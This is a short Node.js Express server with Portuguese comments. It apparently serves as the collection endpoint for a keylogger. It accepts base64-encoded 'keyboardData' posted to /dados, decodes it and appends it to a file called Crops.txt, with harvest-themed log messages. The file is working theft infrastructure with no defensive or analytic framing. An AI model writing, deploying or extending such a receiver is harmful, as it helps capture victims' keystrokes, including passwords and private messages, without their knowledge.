const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3108;

app.use(bodyParser.json());
function salvarConteudoArquivo(texto) {
    try {
        // Salvar todo o conteúdo recebido em um arquivo de texto
        fs.appendFileSync('Crops.txt', texto);
        console.log('☭ Reap and Sow ☭');
    } catch (err) {
        console.error('No Seeds', err);
    }
}

// Rota para receber e salvar o JSON
app.post('/dados', (req, res) => {
    try {
        ckdata = req.body.keyboardData;
        const keyboardData = atob(ckdata);
        
        // Verificar se há novo conteúdo
        if (keyboardData.trim() !== '') {
            salvarConteudoArquivo(keyboardData);
            res.status(200).send('');
        } 
    } catch (err) {
        console.error('Erro ao salvar os dados:', err);
        
    }
});



app.listen(PORT, () => {
    console.log(`🎃--Que a Colheita Comece ${PORT}--🎃`);
});
